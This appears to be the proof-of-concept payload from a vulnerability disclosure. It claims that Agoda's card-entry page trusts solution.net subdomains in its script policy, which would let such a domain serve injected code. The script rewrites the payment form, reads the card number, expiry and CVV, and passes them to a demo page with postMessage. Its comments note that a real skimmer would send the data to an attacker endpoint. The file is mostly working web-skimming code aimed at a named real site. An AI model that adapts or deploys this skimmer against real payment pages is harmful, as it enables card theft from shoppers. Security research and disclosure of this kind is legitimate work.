/*
 * This is the "malicious" script. In the real-world attack this is whatever
 * an attacker who controls solution.net (the domain Agoda's CSP mistakenly
 * trusts as *.wl44.solution.net / *.wl54.solution.net) chooses to serve here.
 *
 * It is loaded by Agoda's own unmodified code (see victim/index.html) via:
 *     jsFile.src = e.path;
 *     document.head.appendChild(jsFile);
 * ...which means everything below executes with full DOM access inside the
 * PCI card-entry origin, exactly as if Agoda's own JS had written it.
 */
(function () {
  var origin = window.location.origin;
  var container = document.getElementById('cc-form');

  if (container) {
    container.innerHTML =
      '<div style="border:3px solid #c0392b;border-radius:8px;padding:16px;font-family:-apple-system,Segoe UI,Arial,sans-serif;max-width:360px;background:#fff3f2;">' +
        '<div style="color:#c0392b;font-weight:700;margin-bottom:8px;font-size:14px;">' +
          '&#9888; This card form was built by a script an ATTACKER injected, not by Agoda.' +
        '</div>' +
        '<div style="font-size:11px;color:#666;margin-bottom:12px;">' +
          'Injected and executing inside origin: <code>' + origin + '</code>' +
        '</div>' +
        '<label style="font-size:12px;color:#333;">Card number</label>' +
        '<input id="poc-card-number" type="text" value="4111 1111 1111 1111" ' +
          'style="display:block;width:100%;padding:7px;margin:4px 0 10px;box-sizing:border-box;' +
          'border:1px solid #ccc;border-radius:4px;font-size:13px;">' +
        '<label style="font-size:12px;color:#333;">Expiry</label>' +
        '<input id="poc-card-exp" type="text" value="12/29" ' +
          'style="display:block;width:100%;padding:7px;margin:4px 0 10px;box-sizing:border-box;' +
          'border:1px solid #ccc;border-radius:4px;font-size:13px;">' +
        '<label style="font-size:12px;color:#333;">CVV</label>' +
        '<input id="poc-card-cvv" type="text" value="123" ' +
          'style="display:block;width:100%;padding:7px;margin:4px 0;box-sizing:border-box;' +
          'border:1px solid #ccc;border-radius:4px;font-size:13px;">' +
        '<div style="font-size:10px;color:#999;margin-top:10px;">' +
          'Values above are pre-filled test data (the standard Visa test PAN) purely for this demo &mdash; nothing real was ever typed or transmitted.' +
        '</div>' +
      '</div>';
  }

  function exfiltrate() {
    var field = function (id) {
      var el = document.getElementById(id);
      return el ? el.value : null;
    };
    var captured = {
      capturedFromOrigin: origin,
      cardNumber: field('poc-card-number'),
      expiry: field('poc-card-exp'),
      cvv: field('poc-card-cvv'),
      documentTitle: document.title,
      href: location.href
    };
    // In a real attack this would go to the attacker's own collection
    // endpoint over a normal fetch/beacon call. For this safe, self-contained
    // reproduction we simply report it back up to the framing page (which is
    // this same demo's "attacker" page) so it can be displayed on screen.
    window.parent.postMessage({ type: 'POC_EXFIL', payload: captured }, '*');
  }

  // Mirrors how a real skimmer would hook input/blur/submit events; here we
  // just fire shortly after render since the fields are pre-filled for the demo.
  setTimeout(exfiltrate, 500);
})();
